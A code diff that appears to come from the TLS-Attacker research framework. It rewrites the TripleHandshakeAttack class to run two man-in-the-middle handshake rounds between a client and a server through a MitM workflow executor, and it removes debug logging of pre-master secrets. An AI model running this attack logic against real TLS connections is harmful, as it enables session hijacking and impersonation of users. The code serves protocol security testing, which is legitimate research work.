@@ -19,18 +19,17 @@
  */
 package de.rub.nds.tlsattacker.attacks.impl;
 
-import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeAttackWorflowThread;
 import de.rub.nds.tlsattacker.tls.Attacker;
 import de.rub.nds.tlsattacker.attacks.config.TripleHandshakeAttackCommandConfig;
-import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeSharedContext;
-import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeWorkflowExecutor;
+import de.rub.nds.tlsattacker.attacks.mitm.MitMWorkflowExecutor;
+import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeInitialWorkflowConfiguration;
+import de.rub.nds.tlsattacker.attacks.ths.TripleHandshakeWorkflowConfiguration;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
 import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
 import de.rub.nds.tlsattacker.tls.config.ServerCommandConfig;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
-import de.rub.nds.tlsattacker.util.ArrayConverter;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -57,46 +56,54 @@ public class TripleHandshakeAttack extends Attacker<TripleHandshakeAttackCommand
 	serverCommandConfig.setPassword(config.getPassword());
 	serverCommandConfig.setAlias(config.getAlias());
 	serverCommandConfig.setWorkflowTraceType(config.getWorkflowTraceType());
-	if (config.isClientAuthentication()) {
-	    serverCommandConfig.setClientAuthentication(true);
-	}
-
-	TripleHandshakeSharedContext sharedContext = new TripleHandshakeSharedContext();
 
 	GeneralConfig generalConfig = new GeneralConfig();
 	ConfigHandler serverConfigHandler = ConfigHandlerFactory.createConfigHandler("server");
 	serverConfigHandler.initializeGeneralConfig(generalConfig);
 	TransportHandler serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
 	TlsContext serverTlsContext = serverConfigHandler.initializeTlsContext(serverCommandConfig);
-	TripleHandshakeWorkflowExecutor serverWorkflowExecutor = new TripleHandshakeWorkflowExecutor(
-		serverTransportHandler, serverTlsContext, sharedContext);
 
 	TransportHandler clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);
 	TlsContext clientTlsContext = clientConfigHandler.initializeTlsContext(config);
-	TripleHandshakeWorkflowExecutor clientWorkflowExecutor = new TripleHandshakeWorkflowExecutor(
-		clientTransportHandler, clientTlsContext, sharedContext);
 
-	Thread server = new Thread(new TripleHandshakeAttackWorflowThread(serverWorkflowExecutor,
-		serverTransportHandler));
-	server.start();
+	TripleHandshakeInitialWorkflowConfiguration clientwf = new TripleHandshakeInitialWorkflowConfiguration(
+		clientTlsContext, config);
+	clientwf.createWorkflow();
 
-	Thread client = new Thread(new TripleHandshakeAttackWorflowThread(clientWorkflowExecutor,
-		clientTransportHandler));
-	client.start();
+	TripleHandshakeInitialWorkflowConfiguration serverwf = new TripleHandshakeInitialWorkflowConfiguration(
+		serverTlsContext, config);
+	serverwf.createWorkflow();
 
-	while (client.isAlive()) {
+	boolean mod = false;
 
-	}
-	LOGGER.debug("ClientRandom Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getClientRandom()));
-	LOGGER.debug("ClientRandom Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getClientRandom()));
-	LOGGER.debug("ServerRandom Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getServerRandom()));
-	LOGGER.debug("ServerRandom Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getServerRandom()));
-	LOGGER.debug("SessionID Server: {}", ArrayConverter.bytesToHexString(serverTlsContext.getSessionID()));
-	LOGGER.debug("SessionID Client: {}", ArrayConverter.bytesToHexString(clientTlsContext.getSessionID()));
-	LOGGER.debug("PreMasterSecret Server: {}",
-		ArrayConverter.bytesToHexString(serverTlsContext.getPreMasterSecret()));
-	LOGGER.debug("PreMasterSecret Client: {}",
-		ArrayConverter.bytesToHexString(clientTlsContext.getPreMasterSecret()));
+	MitMWorkflowExecutor mitmWorkflowExecutor = new MitMWorkflowExecutor(clientTransportHandler,
+		serverTransportHandler, clientTlsContext, serverTlsContext, mod);
+
+	mitmWorkflowExecutor.executeWorkflow();
+
+	clientTransportHandler.closeConnection();
+	serverTransportHandler.closeConnection();
+
+	clientTlsContext.setCertSecure(config.getCertSecure());
+
+	TripleHandshakeWorkflowConfiguration clientwf2 = new TripleHandshakeWorkflowConfiguration(clientTlsContext,
+		config);
+	clientwf2.createWorkflow();
+
+	TripleHandshakeWorkflowConfiguration serverwf2 = new TripleHandshakeWorkflowConfiguration(serverTlsContext,
+		config);
+	serverwf2.createWorkflow();
+
+	serverTransportHandler = serverConfigHandler.initializeTransportHandler(serverCommandConfig);
+	clientTransportHandler = clientConfigHandler.initializeTransportHandler(config);
+
+	MitMWorkflowExecutor mitmWorkflowExecutor2 = new MitMWorkflowExecutor(clientTransportHandler,
+		serverTransportHandler, clientTlsContext, serverTlsContext, mod);
+
+	mitmWorkflowExecutor2.executeWorkflow();
+
+	clientTransportHandler.closeConnection();
+	serverTransportHandler.closeConnection();
+
     }
-
 }
